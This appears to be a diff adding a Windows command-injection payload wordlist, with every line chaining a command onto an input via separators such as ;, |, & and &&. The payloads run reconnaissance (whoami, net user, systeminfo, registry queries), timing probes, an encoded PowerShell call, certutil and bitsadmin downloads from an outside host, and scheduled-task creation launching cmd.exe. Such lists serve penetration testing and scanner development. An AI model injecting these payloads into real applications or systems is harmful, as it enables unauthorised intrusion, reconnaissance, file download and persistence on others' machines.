@@ -1,0 +1,179 @@
+; dir
+; whoami
+; hostname
+; ipconfig
+; ipconfig /all
+; systeminfo
+; net user
+; net localgroup administrators
+; tasklist
+; type C:\Windows\win.ini
+; ver
+; set
+; echo %username%
+; echo %computername%
+| dir
+| whoami
+| hostname
+| ipconfig
+| ipconfig /all
+| systeminfo
+| net user
+| net localgroup administrators
+| tasklist
+| type C:\Windows\win.ini
+| ver
+| set
+| echo %username%
+| echo %computername%
+|| dir
+|| whoami
+|| hostname
+|| ipconfig
+|| ipconfig /all
+|| systeminfo
+|| net user
+|| net localgroup administrators
+|| tasklist
+|| type C:\Windows\win.ini
+|| ver
+|| set
+|| echo %username%
+|| echo %computername%
+& dir
+& whoami
+& hostname
+& ipconfig
+& ipconfig /all
+& systeminfo
+& net user
+& net localgroup administrators
+& tasklist
+& type C:\Windows\win.ini
+& ver
+& set
+& echo %username%
+& echo %computername%
+&& dir
+&& whoami
+&& hostname
+&& ipconfig
+&& ipconfig /all
+&& systeminfo
+&& net user
+&& net localgroup administrators
+&& tasklist
+&& type C:\Windows\win.ini
+&& ver
+&& set
+&& echo %username%
+&& echo %computername%
+; ping -n 5 127.0.0.1
+; ping -n 10 127.0.0.1
+| ping -n 5 127.0.0.1
+| ping -n 10 127.0.0.1
+|| ping -n 5 127.0.0.1
+|| ping -n 10 127.0.0.1
+& ping -n 5 127.0.0.1
+& ping -n 10 127.0.0.1
+&& ping -n 5 127.0.0.1
+&& ping -n 10 127.0.0.1
+; timeout /t 5
+; timeout /t 10
+| timeout /t 5
+| timeout /t 10
+|| timeout /t 5
+|| timeout /t 10
+& timeout /t 5
+& timeout /t 10
+&& timeout /t 5
+&& timeout /t 10
+; cmd /c dir
+; cmd /c whoami
+; cmd /c hostname
+; cmd /c ipconfig
+| cmd /c dir
+| cmd /c whoami
+| cmd /c hostname
+| cmd /c ipconfig
+|| cmd /c dir
+|| cmd /c whoami
+|| cmd /c hostname
+|| cmd /c ipconfig
+& cmd /c dir
+& cmd /c whoami
+& cmd /c hostname
+& cmd /c ipconfig
+&& cmd /c dir
+&& cmd /c whoami
+&& cmd /c hostname
+&& cmd /c ipconfig
+; powershell -Command "Get-Process"
+; powershell -Command "Get-ComputerInfo"
+; powershell -Command "Get-LocalUser"
+; powershell -Command "whoami"
+| powershell -Command "Get-Process"
+| powershell -Command "Get-ComputerInfo"
+| powershell -Command "Get-LocalUser"
+| powershell -Command "whoami"
+|| powershell -Command "Get-Process"
+|| powershell -Command "Get-ComputerInfo"
+|| powershell -Command "Get-LocalUser"
+|| powershell -Command "whoami"
+& powershell -Command "Get-Process"
+& powershell -Command "Get-ComputerInfo"
+& powershell -Command "Get-LocalUser"
+& powershell -Command "whoami"
+&& powershell -Command "Get-Process"
+&& powershell -Command "Get-ComputerInfo"
+&& powershell -Command "Get-LocalUser"
+&& powershell -Command "whoami"
+; powershell.exe -EncodedCommand dwBoAG8AYQBtAGkA
+; powershell.exe -Enc dwBoAG8AYQBtAGkA
+| powershell.exe -EncodedCommand dwBoAG8AYQBtAGkA
+| powershell.exe -Enc dwBoAG8AYQBtAGkA
+; wmic os get caption
+; wmic process list brief
+; wmic useraccount list brief
+| wmic os get caption
+| wmic process list brief
+| wmic useraccount list brief
+|| wmic os get caption
+|| wmic process list brief
+|| wmic useraccount list brief
+& wmic os get caption
+& wmic process list brief
+& wmic useraccount list brief
+&& wmic os get caption
+&& wmic process list brief
+&& wmic useraccount list brief
+; certutil -urlcache -split -f http://example.com/file.txt
+| certutil -urlcache -split -f http://example.com/file.txt
+|| certutil -urlcache -split -f http://example.com/file.txt
+& certutil -urlcache -split -f http://example.com/file.txt
+&& certutil -urlcache -split -f http://example.com/file.txt
+; bitsadmin /transfer job http://example.com/file.txt C:\temp\file.txt
+| bitsadmin /transfer job http://example.com/file.txt C:\temp\file.txt
+|| bitsadmin /transfer job http://example.com/file.txt C:\temp\file.txt
+& bitsadmin /transfer job http://example.com/file.txt C:\temp\file.txt
+&& bitsadmin /transfer job http://example.com/file.txt C:\temp\file.txt
+; reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+; reg query HKCU\Software
+| reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+| reg query HKCU\Software
+|| reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+|| reg query HKCU\Software
+& reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+& reg query HKCU\Software
+&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+&& reg query HKCU\Software
+; schtasks /query
+; schtasks /create /tn test /tr cmd.exe /sc once /st 00:00
+| schtasks /query
+| schtasks /create /tn test /tr cmd.exe /sc once /st 00:00
+|| schtasks /query
+|| schtasks /create /tn test /tr cmd.exe /sc once /st 00:00
+& schtasks /query
+& schtasks /create /tn test /tr cmd.exe /sc once /st 00:00
+&& schtasks /query
+&& schtasks /create /tn test /tr cmd.exe /sc once /st 00:00
